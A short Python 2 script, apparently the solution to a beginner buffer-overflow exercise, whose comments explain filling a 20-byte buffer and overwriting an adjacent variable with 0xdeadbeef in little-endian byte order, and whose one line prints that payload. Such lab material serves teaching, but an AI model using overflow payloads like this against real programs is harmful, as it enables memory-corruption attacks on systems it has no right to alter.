

# fill variable buf of size 20
# after that overwrite variable val with "deadbeef"
# change byte order because remote machine is little endian

print 'A'*20 + '\xef\xbe\xad\xde'

